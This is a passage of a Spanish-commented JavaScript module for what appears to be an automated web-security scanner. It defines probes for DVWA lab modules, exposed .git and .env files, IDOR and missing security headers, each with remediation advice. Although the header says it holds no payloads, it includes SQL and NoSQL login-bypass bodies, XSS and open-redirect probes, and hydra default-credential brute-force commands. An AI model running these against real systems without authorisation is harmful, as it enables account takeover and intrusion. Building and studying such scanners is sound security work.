/**
 * Base de detección de superficie web (HackTricks → playbook / heurísticas).
 *
 * Qué sí: paths de laboratorio, cabeceras, errores de aplicación, cookies,
 * fingerprint. Cada clase apunta a la ficha de HackTricks para clasificar
 * el fallo y la defensa.
 *
 * Qué no: payloads, PoC, procedimientos de explotación ni recetas de ataque.
 * https://hacktricks.wiki/en/index.html
 */

export const HT = "https://hacktricks.wiki/en/pentesting-web/";
export const HT_INDEX = "https://hacktricks.wiki/en/index.html";

/** Techos RGPD (hechos legales, no una multa concreta). */
export const RGPD_SANCTION = {
  art834: {
    art: "Art. 83.4",
    es: "Hasta 10 M€ o el 2 % de la facturación anual global (obligaciones operativas: Arts. 28, 30, 32, 33–34). La AEPD puede sancionar el hueco sin que haya habido un ataque exitoso.",
    en: "Up to €10M or 2% of worldwide annual turnover (Arts. 28, 30, 32, 33–34). The DPA may sanction the gap without a successful attack.",
  },
  art835: {
    art: "Art. 83.5",
    es: "Hasta 20 M€ o el 4 % de la facturación anual global (principios del Art. 5, bases de licitud, derechos de los interesados). Se usa cuando el fallo toca confidencialidad/integridad de datos personales, no solo un procedimiento ausente.",
    en: "Up to €20M or 4% of worldwide annual turnover (Art. 5 principles). Used when personal-data confidentiality/integrity is at stake, not only a missing procedure.",
  },
};

/**
 * Módulos DVWA v1.10 — un GET autenticado por clase.
 * El índice /vulnerabilities/ ya lista los href; el GET por módulo
 * confirma HTTP 200 de esa superficie (no un 302 a login).
 */
export const DVWA_MODULES = [
  {
    id: "sqli_blind",
    path: "/vulnerabilities/sqli_blind/",
    stepId: "sqli-blind",
    probeDesc: "Superficie SQLi ciega (existencia del módulo)",
    title: "Módulo SQL Injection (Blind) DVWA accesible",
    severity: "High",
    cwe: "CWE-89",
    hacktricks: HT + "sql-injection/index.html",
    detect: ["SQL syntax", "mysql", "id="],
    description:
      "Endpoint /vulnerabilities/sqli_blind/: la entrada llega a SQL sin devolver filas (CWE-89). Misma clase que SQLi clásica. En lab basta el módulo autenticado; en producción hace falta evidencia de que la consulta se altera (errores SQL, booleanos). Parametrizar consultas.",
    remediation: "Prepared statements; mínimo privilegio en BD; no exponer el lab.",
  },
  {
    id: "sqli",
    path: "/vulnerabilities/sqli/",
    stepId: "sqli",
    probeDesc: "Superficie SQLi (existencia del módulo)",
    title: "Módulo SQL Injection (DVWA) accesible",
    severity: "High",
    cwe: "CWE-89",
    hacktricks: HT + "sql-injection/index.html",
    detect: ["You have an error in your SQL syntax", "mysql_fetch", "supplied argument is not a valid MySQL"],
    description:
      "Endpoint /vulnerabilities/sqli/: superficie deliberada de inyección SQL (CWE-89, OWASP A03). HackTricks: interferir con consultas de BD. Defensa: parametrizar, no concatenar SQL.",
    remediation: "Parametrizar consultas, WAF como capa extra, mínimo privilegio en BD.",
  },
  {
    id: "xss_s",
    path: "/vulnerabilities/xss_s/",
    stepId: "xss-s",
    probeDesc: "Superficie XSS almacenado (existencia del módulo)",
    title: "Módulo XSS (Stored) DVWA accesible",
    severity: "High",
    cwe: "CWE-79",
    hacktricks: HT + "xss-cross-site-scripting/index.html",
    detect: ["guestbook", "name=", "message="],
    description:
      "Endpoint /vulnerabilities/xss_s/: XSS persistente (CWE-79). El script se guarda y se sirve a otras sesiones. Encadena con cookies sin HttpOnly.",
    remediation: "Encoding contextual, CSP, HttpOnly.",
  },
  {
    id: "xss_d",
    path: "/vulnerabilities/xss_d/",
    stepId: "xss-d",
    probeDesc: "Superficie XSS DOM (existencia del módulo)",
    title: "Módulo XSS (DOM) DVWA accesible",
    severity: "High",
    cwe: "CWE-79",
    hacktricks: HT + "xss-cross-site-scripting/index.html",
    detect: ["location", "document.write", "innerHTML"],
    description:
      "Endpoint /vulnerabilities/xss_d/: XSS en el DOM (CWE-79). El script se arma en el navegador desde la URL. Defensa: no usar innerHTML con datos de URL.",
    remediation: "No usar innerHTML con datos de URL; CSP.",
  },
  {
    id: "xss_r",
    path: "/vulnerabilities/xss_r/",
    stepId: "xss-r",
    probeDesc: "Superficie XSS reflejado (existencia del módulo)",
    title: "Módulo XSS (Reflected) DVWA accesible",
    severity: "High",
    cwe: "CWE-79",
    hacktricks: HT + "xss-cross-site-scripting/index.html",
    detect: ["name=", "Hello"],
    description:
      "Endpoint /vulnerabilities/xss_r/: XSS reflejado (CWE-79). La entrada vuelve en el HTML de la misma respuesta.",
    remediation: "Codificar salida HTML, CSP, HttpOnly en cookies de sesión.",
  },
  {
    id: "exec",
    path: "/vulnerabilities/exec/",
    stepId: "exec",
    probeDesc: "Superficie command injection (existencia del módulo)",
    title: "Módulo Command Injection (DVWA) accesible",
    severity: "Critical",
    cwe: "CWE-78",
    hacktricks: HT + "command-injection/index.html",
    detect: ["ping", "ip=", "system(", "shell_exec"],
    description:
      "Endpoint /vulnerabilities/exec/: la entrada puede alcanzar una shell del SO (CWE-78). Impacto: ejecución en el host, no solo en la BD. Defensa: no interpolar input en system()/exec().",
    remediation: "No interpolar input en system()/exec(); APIs nativas; allow-list.",
  },
  {
    id: "fi",
    path: "/vulnerabilities/fi/",
    stepId: "fi",
    probeDesc: "Superficie file inclusion (existencia del módulo)",
    title: "Módulo File Inclusion (DVWA) accesible",
    severity: "High",
    cwe: "CWE-98",
    hacktricks: HT + "file-inclusion/index.html",
    detect: ["page=", "include", "allow_url_include"],
    description:
      "Endpoint /vulnerabilities/fi/: include/require con path controlable (CWE-98). LFI/RFI si allow_url_include está On.",
    remediation: "Allow-list de páginas; allow_url_include=Off; no pasar paths de usuario.",
  },
  {
    id: "upload",
    path: "/vulnerabilities/upload/",
    stepId: "upload",
    probeDesc: "Superficie file upload (existencia del módulo)",
    title: "Módulo File Upload (DVWA) accesible",
    severity: "High",
    cwe: "CWE-434",
    hacktricks: HT + "file-upload/index.html",
    detect: ["multipart/form-data", "type=\"file\"", "hackable/uploads"],
    description:
      "Endpoint /vulnerabilities/upload/: subida de ficheros. Si el servidor ejecuta lo subido, hay persistencia (CWE-434).",
    remediation: "Validar tipo en servidor; directorio sin ejecución; nombres aleatorios.",
  },
  {
    id: "csrf",
    path: "/vulnerabilities/csrf/",
    stepId: "csrf",
    probeDesc: "Superficie CSRF (existencia del módulo)",
    title: "Módulo CSRF (DVWA) accesible",
    severity: "High",
    cwe: "CWE-352",
    hacktricks: HT + "csrf-cross-site-request-forgery/index.html",
    detect: ["password_new", "password_conf", "Change"],
    description:
      "Endpoint /vulnerabilities/csrf/: peticiones de estado sin prueba de origen (CWE-352). Defensa: token anti-CSRF, SameSite, no GET para mutaciones.",
    remediation: "Token anti-CSRF en POST; SameSite; no GET para mutaciones.",
  },
  {
    id: "brute",
    path: "/vulnerabilities/brute/",
    stepId: "brute",
    probeDesc: "Superficie brute-force de login (existencia del módulo)",
    title: "Módulo Brute Force (DVWA) accesible",
    severity: "High",
    cwe: "CWE-307",
    hacktricks: HT_INDEX,
    detect: ["username", "password", "Login"],
    description:
      "Endpoint /vulnerabilities/brute/: login sin rate-limit/lockout evidentes (CWE-307).",
    remediation: "Rate limit, lockout, MFA, errores genéricos.",
  },
  {
    id: "weak_id",
    path: "/vulnerabilities/weak_id/",
    stepId: "weak-id",
    probeDesc: "Superficie IDs de sesión débiles (existencia del módulo)",
    title: "Módulo Weak Session IDs (DVWA) accesible",
    severity: "Medium",
    cwe: "CWE-330",
    hacktricks: HT + "hacking-with-cookies/index.html",
    detect: ["dvwaSession", "Set-Cookie"],
    description:
      "Endpoint /vulnerabilities/weak_id/: identificadores de sesión predecibles (CWE-330).",
    remediation: "CSPRNG, regenerar ID al login, flags HttpOnly/Secure/SameSite.",
  },
  {
    id: "captcha",
    path: "/vulnerabilities/captcha/",
    stepId: "captcha",
    probeDesc: "Superficie CAPTCHA inseguro (existencia del módulo)",
    title: "Módulo Insecure CAPTCHA (DVWA) accesible",
    severity: "Medium",
    cwe: "CWE-804",
    hacktricks: HT_INDEX,
    detect: ["captcha", "recaptcha"],
    description:
      "Endpoint /vulnerabilities/captcha/: CAPTCHA de laboratorio, a menudo verificable solo en cliente.",
    remediation: "Verificar CAPTCHA en servidor; rate limit adicional.",
  },
  {
    id: "csp",
    path: "/vulnerabilities/csp/",
    stepId: "csp",
    probeDesc: "Superficie CSP débil (existencia del módulo)",
    title: "Módulo CSP Bypass (DVWA) accesible",
    severity: "Medium",
    cwe: "CWE-693",
    hacktricks: HT + "content-security-policy-csp-bypass/index.html",
    detect: ["Content-Security-Policy", "unsafe-inline", "script-src"],
    description:
      "Endpoint /vulnerabilities/csp/: Content-Security-Policy débil o demostrablemente evadible (CWE-693).",
    remediation: "CSP con nonce/hash; sin unsafe-inline.",
  },
  {
    id: "javascript",
    path: "/vulnerabilities/javascript/",
    stepId: "js",
    probeDesc: "Superficie validación solo en cliente (existencia del módulo)",
    title: "Módulo JavaScript (DVWA) accesible",
    severity: "Medium",
    cwe: "CWE-602",
    hacktricks: HT_INDEX,
    detect: ["<script", "onsubmit"],
    description:
      "Endpoint /vulnerabilities/javascript/: controles solo en el cliente (CWE-602).",
    remediation: "Replicar validación en el backend.",
  },
];

/** Pasos extra de superficie (misconfig), no son módulos del menú DVWA.
 *  Siempre pedimos el cuerpo: un HTTP 200 de -w no basta para secretos (.bak)
 *  y el eje de curls colapsaba status-only vs GET del mismo path. */
export const DVWA_EXTRA_PROBES = [
  { stepId: "phpini", path: "/php.ini", desc: "php.ini en document root", statusOnly: false },
  { stepId: "config-bak", path: "/config/config.inc.php.bak", desc: "Backup de config.inc.php", statusOnly: false },
  { stepId: "config-dist", path: "/config/config.inc.php.dist", desc: "config.inc.php.dist", statusOnly: false },
];

/**
 * Sondas genéricas de exposición (cualquier stack, no solo DVWA).
 * Un HTTP 200 no basta: el heurístico exige `bodyRe` sobre el cuerpo real
 * (config de git, variables .env, JSON de swagger…) para confirmar el hallazgo.
 */
export const GENERIC_EXPOSURE_PROBES = [
  {
    stepId: "git-head",
    path: "/.git/HEAD",
    title: "Repositorio .git expuesto en el document root",
    severity: "Critical",
    cwe: "CWE-527",
    hacktricks: "https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html",
    bodyRe: /ref:\s*refs\/heads\//i,
    description:
      "GET /.git/HEAD devuelve un puntero de rama válido: el repositorio Git (historial completo, commits borrados, posibles secretos) es reconstruible objeto a objeto sin autenticación.",
    remediation: "Retirar .git del document root en despliegue; denegar rutas ocultas a nivel de servidor web; rotar cualquier secreto que haya pasado por el historial.",
  },
  {
    stepId: "git-config",
    path: "/.git/config",
    title: "Configuración .git/config expuesta",
    severity: "Critical",
    cwe: "CWE-527",
    hacktricks: "https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html",
    bodyRe: /\[core\]|\[remote\s+["']?origin/i,
    description: "GET /.git/config devuelve la configuración del repositorio (remoto origin, en ocasiones credenciales embebidas en la URL) y confirma que .git es navegable.",
    remediation: "Retirar .git del document root; nunca incluir credenciales en la URL del remoto.",
  },
  {
    stepId: "env-file",
    path: "/.env",
    title: "Archivo .env expuesto en el document root",
    severity: "Critical",
    cwe: "CWE-538",
    hacktricks: HT_INDEX,
    bodyRe: /APP_KEY=|DB_PASSWORD=|DATABASE_URL=|SECRET_KEY=|AWS_SECRET_ACCESS_KEY/i,
    description: "GET /.env devuelve variables de entorno de la aplicación: claves de framework, credenciales de base de datos y secretos de terceros en texto claro.",
    remediation: "Sacar .env del document root; denegarlo por configuración del servidor web; rotar de inmediato todos los secretos filtrados.",
  },
  {
    stepId: "htpasswd",
    path: "/.htpasswd",
    title: "Archivo .htpasswd expuesto",
    severity: "High",
    cwe: "CWE-538",
    hacktricks: HT_INDEX,
    bodyRe: /^[\w.-]+:\$?(apr1|2y|1)?\$/im,
    description: "GET /.htpasswd devuelve usuarios y hashes de autenticación básica, crackeables offline.",
    remediation: "Denegar acceso a archivos .ht* vía configuración del servidor; mover fuera del document root.",
  },
  {
    stepId: "swagger-json",
    path: "/swagger.json",
    title: "Definición Swagger/OpenAPI expuesta sin autenticación",
    severity: "Medium",
    cwe: "CWE-200",
    hacktricks: HT_INDEX,
    bodyRe: /"swagger"\s*:|"openapi"\s*:/i,
    description: "El documento Swagger/OpenAPI lista endpoints, parámetros y modelos completos de la API sin autenticación, ampliando la superficie de ataque conocida por el atacante.",
    remediation: "Restringir la documentación de API a red interna o autenticación; no publicarla en el entorno productivo.",
  },
  {
    stepId: "actuator-env",
    path: "/actuator/env",
    title: "Spring Boot Actuator /env expuesto",
    severity: "Critical",
    cwe: "CWE-200",
    hacktricks: HT_INDEX,
    bodyRe: /"activeProfiles"|"propertySources"/i,
    description: "El endpoint /actuator/env responde sin autenticación, filtrando variables de entorno, propiedades de Spring y a menudo credenciales de configuración.",
    remediation: "Deshabilitar actuator en producción o exigir autenticación/roles (management.endpoints.web.exposure).",
  },
  {
    stepId: "phpmyadmin",
    path: "/phpmyadmin/",
    title: "Panel phpMyAdmin accesible",
    severity: "Medium",
    cwe: "CWE-284",
    hacktricks: HT_INDEX,
    bodyRe: /phpMyAdmin/i,
    description: "phpMyAdmin es alcanzable sin restricción de red. Combinado con credenciales por defecto o débiles, es acceso directo a la base de datos.",
    remediation: "Restringir por IP/VPN; deshabilitar en producción; credenciales fuertes y 2FA si debe permanecer accesible.",
  },
  {
    stepId: "webconfig",
    path: "/web.config",
    title: "web.config expuesto (.NET)",
    severity: "High",
    cwe: "CWE-538",
    hacktricks: HT_INDEX,
    bodyRe: /<configuration>|connectionStrings/i,
    description: "web.config es servido por HTTP; puede contener connection strings y claves de máquina de aplicaciones .NET.",
    remediation: "Bloquear la extensión .config a nivel de IIS; mover secretos a un vault o variables de entorno.",
  },
];

/**
 * Listado de directorio real (autoindex Apache/nginx o serve-index de
 * Express/Node): confirma que una ruta es navegable, no solo que devolvió
 * HTTP 200 (una SPA devuelve 200+HTML de la app para cualquier ruta).
 */
export const DIRECTORY_LISTING_RE = /<title>\s*(index of|listing directory)|<h1>\s*index of/i;

/**
 * Superficie de apps REST/API modernas (Node/Express, Angular/React SPA,
 * microservicios) que el playbook original (pensado para PHP/DVWA) no
 * cubre: directorios estáticos mal cerrados, métricas de observabilidad y
 * source maps — nada de esto tiene relación con config.inc.php/php.ini.
 */
export const API_SURFACE_PROBES = [
  {
    stepId: "dir-ftp",
    path: "/ftp/",
    severity: "High",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /ftp/ listable sin autenticación",
    description:
      "GET /ftp/ devuelve un listado de directorio real (autoindex/serve-index): expone los nombres de archivo internos (documentos, backups, credenciales) sin autenticación. Cualquier archivo dentro es descargable directamente si el filtro de extensión no lo bloquea (CWE-548, CWE-200).",
    remediation: "Desactivar el listado de directorios en el servidor web; retirar del document root cualquier archivo que no deba ser público; no usar una carpeta estática para guardar documentos internos.",
  },
  {
    stepId: "dir-backup",
    path: "/backup/",
    severity: "High",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /backup/ listable sin autenticación",
    description:
      "GET /backup/ devuelve un listado de directorio real: es habitual que estas rutas contengan volcados de base de datos o copias de configuración con secretos (CWE-548, CWE-200).",
    remediation: "Desactivar el listado de directorios; mover backups fuera del document root y cifrarlos en reposo.",
  },
  {
    stepId: "dir-files",
    path: "/files/",
    severity: "Medium",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /files/ listable sin autenticación",
    description:
      "GET /files/ devuelve un listado de directorio real, exponiendo nombres de archivo internos que deberían enumerarse solo a través de la aplicación (CWE-548).",
    remediation: "Desactivar el listado de directorios en el servidor web; servir archivos solo a través de rutas de la aplicación con control de acceso.",
  },
  {
    stepId: "dir-uploads",
    path: "/uploads/",
    severity: "Medium",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /uploads/ listable sin autenticación",
    description:
      "GET /uploads/ devuelve un listado de directorio real. Si los usuarios suben documentos privados (no solo imágenes públicas), quedan enumerables por cualquiera (CWE-548).",
    remediation: "Desactivar el listado de directorios; servir subidas de usuario vía la aplicación con control de acceso, no como carpeta estática abierta.",
  },
  {
    stepId: "dir-storage",
    path: "/storage/",
    severity: "Medium",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /storage/ listable sin autenticación",
    description:
      "GET /storage/ devuelve un listado de directorio real, exponiendo la estructura interna de almacenamiento de la aplicación (CWE-548).",
    remediation: "Desactivar el listado de directorios en el servidor web; restringir /storage/ a la aplicación, no al navegador directo.",
  },
  {
    stepId: "metrics",
    path: "/metrics",
    severity: "Low",
    bodyRe: /^#\s*HELP\s|^#\s*TYPE\s/m,
    title: "Endpoint /metrics (Prometheus) expuesto sin autenticación",
    description:
      "El endpoint /metrics devuelve métricas en formato Prometheus (rutas internas, contadores de peticiones, tiempos de respuesta) sin autenticación, facilitando reconocimiento de topología y patrones de uso (CWE-200).",
    remediation: "Restringir /metrics a la red interna (scrape solo desde el Prometheus del entorno) o exigir autenticación; no exponerlo a Internet.",
  },
  {
    stepId: "sourcemap-main",
    path: "/main.js.map",
    severity: "Low",
    bodyRe: /"sourcesContent"|"sources"\s*:\s*\[/,
    title: "Source map de JavaScript expuesto (main.js.map)",
    description:
      "El source map del bundle principal es descargable, permitiendo reconstruir el código TypeScript/JavaScript original (nombres de variables, comentarios, lógica de negocio) sin ingeniería inversa del bundle minificado (CWE-540).",
    remediation: "No publicar archivos .map en el despliegue de producción; excluirlos del build o servirlos solo tras autenticación del equipo de desarrollo.",
  },
];

/** Pasos curl de sondas de superficie REST/API (directorios, métricas, source maps). */
export function apiSurfaceCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return API_SURFACE_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", ["-s", "-L", "--max-time", maxTime, baseUrl + p.path], null, {
      desc: `Sonda de superficie REST/API: ${p.path}`,
    }),
  );
}

/**
 * Bypass de autenticación por SQL injection en login — genérico (no solo
 * DVWA): intenta ' OR 1=1-- contra los formatos de login más comunes
 * (REST JSON tipo Juice Shop/Express, y form-urlencoded clásico). Un login
 * legítimo con este payload devuelve 401/"credenciales inválidas"; si la
 * consulta concatena el input en SQL, la condición siempre-verdadero
 * autentica sin contraseña real y el servidor emite un token de sesión.
 */
export const SQLI_LOGIN_PROBES = [
  {
    stepId: "rest-user-login",
    path: "/rest/user/login",
    contentType: "application/json",
    body: "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}",
  },
  {
    stepId: "api-login",
    path: "/api/login",
    contentType: "application/json",
    body: "{\"username\":\"' OR 1=1--\",\"password\":\"x\"}",
  },
  {
    stepId: "login-form",
    path: "/login",
    contentType: "application/x-www-form-urlencoded",
    body: "username=' OR '1'='1'-- -&password=x",
  },
];

/** Pasos curl POST del bypass de login por SQL injection (fase 1, genérico). */
export function sqliLoginProbeSteps(step, prefix, baseUrl, maxTime = "12") {
  return SQLI_LOGIN_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", [
      "-s", "-X", "POST", "--max-time", maxTime,
      "-H", `Content-Type: ${p.contentType}`,
      "-H", `X-DS-Playbook: ${prefix}-${p.stepId}`,
      "-d", p.body,
      baseUrl + p.path,
    ], null, {
      desc: `Sonda de bypass de login por SQL injection: ${p.path}`,
    }),
  );
}

/**
 * Bypass de autenticación por NoSQL injection en login — mismo principio que
 * SQLI_LOGIN_PROBES pero con operadores de MongoDB ($gt: "" es siempre
 * verdadero contra cualquier valor no vacío) en vez de sintaxis SQL. Apunta
 * a los mismos endpoints REST comunes: si el backend usa Mongo/Mongoose y
 * pasa el objeto del body directo al query sin sanear, el operador se
 * ejecuta como condición del filtro en vez de compararse como string.
 */
export const NOSQLI_LOGIN_PROBES = [
  {
    stepId: "rest-user-login",
    path: "/rest/user/login",
    contentType: "application/json",
    body: "{\"email\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
  },
  {
    stepId: "api-login",
    path: "/api/login",
    contentType: "application/json",
    body: "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
  },
];

/** Pasos curl POST del bypass de login por NoSQL injection (fase 1, genérico). */
export function nosqliLoginProbeSteps(step, prefix, baseUrl, maxTime = "12") {
  return NOSQLI_LOGIN_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", [
      "-s", "-X", "POST", "--max-time", maxTime,
      "-H", `Content-Type: ${p.contentType}`,
      "-H", `X-DS-Playbook: ${prefix}-${p.stepId}`,
      "-d", p.body,
      baseUrl + p.path,
    ], null, {
      desc: `Sonda de bypass de login por NoSQL injection: ${p.path}`,
    }),
  );
}

/**
 * XSS reflejado genérico: un marcador único con caracteres que rompen HTML
 * (`<...>`) en parámetros de query habituales. Si vuelve SIN escapar en el
 * cuerpo, la app interpola la entrada en el HTML de respuesta sin
 * sanitizar — la explotabilidad real (contexto exacto, WAF, CSP) requiere
 * confirmación manual, pero el reflejo sin escapar ya es la señal que
 * importa detectar de forma automática.
 */
export const XSS_REFLECTION_MARKER = "dsxss1337";
export const XSS_REFLECTION_PAYLOAD = `<${XSS_REFLECTION_MARKER}>`;
export const XSS_REFLECTION_PARAMS = ["q", "search", "query", "name", "s"];

export function xssReflectionCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return XSS_REFLECTION_PARAMS.map((param) =>
    step(`${prefix}-${param}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-G", "--data-urlencode", `${param}=${XSS_REFLECTION_PAYLOAD}`,
      baseUrl + "/",
    ], null, {
      desc: `Sonda de XSS reflejado genérico: parámetro ?${param}=`,
    }),
  );
}

/**
 * Open redirect genérico: parámetros habituales de redirección con una URL
 * externa de prueba. Si el servidor responde con Location apuntando a esa
 * URL (sin validar contra allow-list), es redirect abierto — útil para
 * phishing y para blanquear enlaces maliciosos con el dominio de confianza.
 */
export const OPEN_REDIRECT_TEST_URL = "https://ds-redirect-probe.invalid/";
export const OPEN_REDIRECT_PARAMS = ["redirect", "redirect_uri", "url", "next", "return", "returnUrl", "continue", "dest", "to"];
// "/redirect" además de la raíz: convención muy habitual (tracking de
// salida a enlaces externos, p. ej. Juice Shop) para un endpoint dedicado
// en vez de un parámetro cualquiera en cualquier ruta.
export const OPEN_REDIRECT_PATHS = ["/", "/redirect"];

export function openRedirectCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  const steps = [];
  for (const path of OPEN_REDIRECT_PATHS) {
    for (const param of OPEN_REDIRECT_PARAMS) {
      const pathTag = path === "/" ? "root" : path.replace(/\//g, "");
      steps.push(step(`${prefix}-${pathTag}-${param}`, "curl", [
        "-s", "-I", "--max-time", maxTime,
        "-G", "--data-urlencode", `${param}=${OPEN_REDIRECT_TEST_URL}`,
        baseUrl + path,
      ], null, {
        desc: `Sonda de open redirect: ${path}?${param}=`,
      }));
    }
  }
  return steps;
}

/**
 * IDOR genérico: rutas de recurso por ID numérico que siguen convenciones
 * REST comunes (users/1, orders/1, basket/1…). Sin sesión ni cookie: si
 * devuelven HTTP 200 con datos de aspecto real (email, username, precio,
 * productos) en vez de un 401/403/404, el endpoint expone objetos ajenos
 * sin verificar que el llamante tenga permiso sobre ESE id (CWE-639).
 * No cubre todos los casos (haría falta una sesión real para IDOR
 * horizontal entre dos usuarios distintos); esto detecta el caso más
 * grave: acceso SIN NINGUNA sesión.
 */
export const IDOR_PROBES = [
  { stepId: "api-users-1", path: "/api/users/1" },
  { stepId: "api-user-1", path: "/api/user/1" },
  { stepId: "rest-user-1", path: "/rest/user/1" },
  { stepId: "api-orders-1", path: "/api/orders/1" },
  { stepId: "api-order-1", path: "/api/order/1" },
  { stepId: "api-accounts-1", path: "/api/accounts/1" },
  { stepId: "api-profile-1", path: "/api/profile/1" },
  { stepId: "rest-basket-1", path: "/rest/basket/1" },
];
export const IDOR_DATA_MARKER_RE = /"email"\s*:|"username"\s*:|"passwordhash"\s*:|"totalprice"\s*:|"products"\s*:\s*\[/i;
export const IDOR_DENIED_RE = /unauthorized|not authenticated|"message"\s*:\s*"jwt|forbidden|cast to objectid failed|not found/i;

export function idorCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return IDOR_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", [
      "-s", "-L", "--max-time", maxTime, "-w", "\nDS_HTTP:%{http_code}\n",
      baseUrl + p.path,
    ], null, {
      desc: `Sonda de IDOR: ${p.path} sin autenticación`,
    }),
  );
}

/**
 * Credenciales por defecto contra endpoints de login REST/JSON conocidos,
 * vía hydra (módulo http-post-form) con diccionarios curados y pequeños
 * (SecLists top-usernames-shortlist × top-passwords-shortlist), no un
 * dump de contraseñas filtradas: la pregunta no es "¿qué contraseña real
 * usa esta persona?" (eso es rockyou.txt, offline, contra un hash), sino
 * "¿sigue en un usuario/contraseña de fábrica evidente?". Detecta éxito
 * por la misma señal que SQLI/NOSQLI_LOGIN_PROBES (JWT en la respuesta),
 * no por adivinar un string de "login incorrecto" que varía por app.
 * Solo corre en fase 3 (hydra está en PHASE_TOOLS[3] en bridge.py).
 */
export const HYDRA_USERLIST = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt";
export const HYDRA_PASSLIST = "/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt";
export const DEFAULT_CREDS_LOGIN_PROBES = [
  {
    stepId: "rest-user-login",
    path: "/rest/user/login",
    // Los ":" del JSON deben escaparse para el parser de hydra (":" separa
    // sus propios campos); "\:" es literal para hydra, no para el shell:
    // este array llega a subprocess sin shell, cada elemento es un argv.
    bodyTemplate: "{\"email\"\\:\"^USER^\",\"password\"\\:\"^PASS^\"}",
  },
  {
    stepId: "api-login",
    path: "/api/login",
    bodyTemplate: "{\"username\"\\:\"^USER^\",\"password\"\\:\"^PASS^\"}",
  },
];

function hydraTarget(baseUrl) {
  try {
    const u = new URL(baseUrl);
    return { host: u.hostname, port: u.port || (u.protocol === "https:" ? "443" : "80") };
  } catch {
    return { host: baseUrl, port: "80" };
  }
}

/** Pasos hydra de credenciales por defecto contra endpoints de login JSON (fase 3). */
export function hydraDefCredsSteps(step, prefix, baseUrl) {
  const { host, port } = hydraTarget(baseUrl);
  return DEFAULT_CREDS_LOGIN_PROBES.map((p) => {
    const misc = `${p.path}:${p.bodyTemplate}:G=1:H=Content-Type\\: application/json:S=eyJ`;
    return step(`${prefix}-${p.stepId}`, "hydra", [
      "-L", HYDRA_USERLIST,
      "-P", HYDRA_PASSLIST,
      "-f", "-t", "16",
      "-s", port,
      host,
      "http-post-form",
      misc,
    ], null, {
      desc: `Credenciales por defecto (diccionario) contra ${p.path}`,
    });
  });
}

/** Línea de éxito de hydra: "[http-post-form] ... login: X   password: Y". */
export const HYDRA_SUCCESS_RE = /\[http-post-form\][^\n]*login:\s*(\S+)\s+password:\s*(\S+)/i;

/**
 * Cabeceras y cookies de seguridad — genérico, cualquier stack. Ausencias
 * habituales que un pentester manual siempre revisa a mano: HSTS, nosniff,
 * protección de clickjacking, CSP, y flags de cookies de sesión.
 */
export function securityHeaderFindings(headText, baseUrl) {
  const h = String(headText || "");
  if (!h.trim()) return [];
  const isHttps = /^https:/i.test(String(baseUrl || ""));
  const out = [];

  if (isHttps && !/strict-transport-security\s*:/i.test(h)) {
    out.push({
      title: "Falta Strict-Transport-Security (HSTS)",
      severity: "Low",
      description: "El servidor responde por HTTPS pero no envía Strict-Transport-Security (CWE-319): un downgrade a HTTP o un atacante en la red no se previene a nivel de navegador en visitas futuras.",
      remediation: "Añadir Strict-Transport-Security: max-age=31536000; includeSubDomains (y preload si aplica a toda la organización).",
    });
  }
  if (!/x-content-type-options\s*:\s*nosniff/i.test(h)) {
    out.push({
      title: "Falta X-Content-Type-Options: nosniff",
      severity: "Low",
      description: "Sin X-Content-Type-Options: nosniff (CWE-693), el navegador puede reinterpretar (MIME-sniff) una respuesta como un tipo distinto al declarado, ampliando el impacto de una subida de archivos maliciosa o una respuesta de API mal tipada.",
      remediation: "Añadir X-Content-Type-Options: nosniff en todas las respuestas.",
    });
  }
  const cspMatch = h.match(/content-security-policy\s*:\s*([^\r\n]+)/i);
  const hasFrameAncestors = cspMatch && /frame-ancestors/i.test(cspMatch[1]);
  const hasXfo = /x-frame-options\s*:/i.test(h);
  if (!hasXfo && !hasFrameAncestors) {
    out.push({
      title: "Sin protección contra clickjacking (falta X-Frame-Options / frame-ancestors)",
      severity: "Medium",
      description: "Ni X-Frame-Options ni una Content-Security-Policy con frame-ancestors están presentes (CWE-1021): el sitio puede embeberse en un <iframe> desde un dominio atacante para trucos de superposición de UI (clickjacking).",
      remediation: "Añadir Content-Security-Policy: frame-ancestors 'none' (o 'self') y/o X-Frame-Options: DENY/SAMEORIGIN.",
    });
  }
  if (!cspMatch) {
    out.push({
      title: "Falta Content-Security-Policy",
      severity: "Low",
      description: "No se envía cabecera Content-Security-Policy (CWE-693): sin esta defensa en profundidad, un XSS que sí logre colarse es mucho más fácil de explotar (carga de script externo, exfiltración de datos).",
      remediation: "Definir una CSP restrictiva (default-src 'self'; script-src explícito y sin unsafe-inline).",
    });
  }
  const seenCookieChecks = new Set();
  for (const m of h.matchAll(/set-cookie\s*:\s*([^\r\n]+)/gi)) {
    const c = m[1];
    const name = (c.split("=")[0] || "cookie").trim();
    // Un mismo Set-Cookie puede repetirse (redirects, sesión regenerada);
    // no duplicar el mismo hallazgo de flags para la misma cookie.
    if (seenCookieChecks.has(name)) continue;
    seenCookieChecks.add(name);
    const looksSensitive = /session|token|auth|sid\b|jwt|connect\.sid/i.test(name);
    if (isHttps && !/;\s*secure\b/i.test(c)) {
      out.push({
        title: `Cookie «${name}» sin flag Secure`,
        severity: "Medium",
        description: `La cookie ${name} se emite por HTTPS sin el flag Secure (CWE-614): el navegador la enviaría igual si el sitio se sirve alguna vez por HTTP plano (downgrade, proxy mal configurado, red hostil), exponiéndola en tránsito.`,
